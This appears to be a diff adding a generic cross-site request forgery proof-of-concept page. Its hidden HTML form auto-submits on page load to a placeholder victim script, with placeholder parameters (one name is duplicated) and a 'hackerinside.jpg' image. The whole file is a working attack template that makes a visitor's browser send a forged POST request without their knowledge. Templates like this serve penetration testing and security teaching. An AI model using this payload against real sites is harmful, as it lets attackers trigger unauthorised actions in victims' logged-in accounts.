@@ -1,0 +1,17 @@
+<html>
+
+<body onload="attack()" bgcolor="#000000">
+        <img src="hackerinside.jpg" />
+        <script>
+            function attack() {
+                document.getElementById('hidden_form').submit.click();
+            }
+        </script>
+        <form id="hidden_form" name="hidden_form" method="POST" action="http://URL/VICTIM_SCRIPT.php">
+            <input type="hidden" name="param1" value="test1" />
+            <input type="hidden" name="param1" value="test1" />
+            <input type="submit" name="submit" value="" />
+        </form>
+</body>
+
+</html>
